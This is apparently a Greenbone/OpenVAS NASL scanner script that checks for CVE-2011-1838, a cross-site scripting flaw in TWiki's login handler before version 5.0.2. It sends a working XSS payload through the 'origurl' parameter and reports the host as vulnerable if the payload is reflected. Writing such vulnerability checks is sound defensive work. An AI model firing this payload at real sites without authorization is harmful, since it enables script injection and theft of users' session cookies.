CPE = "cpe:/a:twiki:twiki";
if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.902434" );
	script_version( "2021-09-01T07:45:06+0000" );
	script_tag( name: "last_modification", value: "2021-09-01 07:45:06 +0000 (Wed, 01 Sep 2021)" );
	script_tag( name: "creation_date", value: "2011-05-26 10:47:46 +0200 (Thu, 26 May 2011)" );
	script_tag( name: "cvss_base", value: "4.3" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:M/Au:N/C:N/I:P/A:N" );
	script_cve_id( "CVE-2011-1838" );
	script_bugtraq_id( 47899 );
	script_name( "TWiki 'TemplateLogin.pm' Multiple XSS Vulnerabilities" );
	script_copyright( "Copyright (C) 2011 Greenbone Networks GmbH" );
	script_category( ACT_ATTACK );
	script_family( "Web application abuses" );
	script_dependencies( "gb_twiki_detect.sc" );
	script_require_ports( "Services/www", 80 );
	script_mandatory_keys( "twiki/detected" );
	script_tag( name: "impact", value: "Successful exploitation could allow attackers to inject arbitrary web script
  or HTML. This may allow the attacker to steal cookie-based authentication credentials and to launch other
  attacks." );
	script_tag( name: "affected", value: "TWiki version prior to 5.0.2" );
	script_tag( name: "insight", value: "Multiple flaws are due to an input validation error in lib/TWiki
  /LoginManager/TemplateLogin.pm, when handling 'origurl' parameter to a view or login script." );
	script_tag( name: "solution", value: "Apply the patch or upgrade to TWiki 5.0.2 or later." );
	script_xref( name: "URL", value: "http://twiki.org/cgi-bin/view/Codev/DownloadTWiki" );
	script_tag( name: "summary", value: "The host is running TWiki and is prone to multiple cross site
  scripting vulnerabilities." );
	script_xref( name: "URL", value: "http://secunia.com/advisories/44594" );
	script_xref( name: "URL", value: "http://securitytracker.com/id?1025542" );
	script_xref( name: "URL", value: "http://www.mavitunasecurity.com/netsparker-advisories/" );
	script_xref( name: "URL", value: "http://www.mavitunasecurity.com/XSS-vulnerability-in-Twiki/" );
	script_xref( name: "URL", value: "http://twiki.org/cgi-bin/view/Codev/SecurityAlert-CVE-2011-1838" );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_tag( name: "qod_type", value: "remote_analysis" );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("host_details.inc.sc");
if(!port = get_app_port( cpe: CPE )){
	exit( 0 );
}
if(!dir = get_app_location( cpe: CPE, port: port )){
	exit( 0 );
}
if(dir == "/"){
	dir = "";
}
url = dir + "/login/Main/WebHome?\"1=;origurl=1\"\"" + "--></style></script><script>alert(\"XSS-TEST\")</script>";
req = http_get( item: url, port: port );
res = http_keepalive_send_recv( port: port, data: req );
if(IsMatchRegexp( res, "^HTTP/1\\.[01] 200" ) && ContainsString( res, "-></style></script><script>alert(\"XSS-TEST\")</script>" )){
	report = http_report_vuln_url( port: port, url: url );
	security_message( port: port, data: report );
	exit( 0 );
}
exit( 99 );

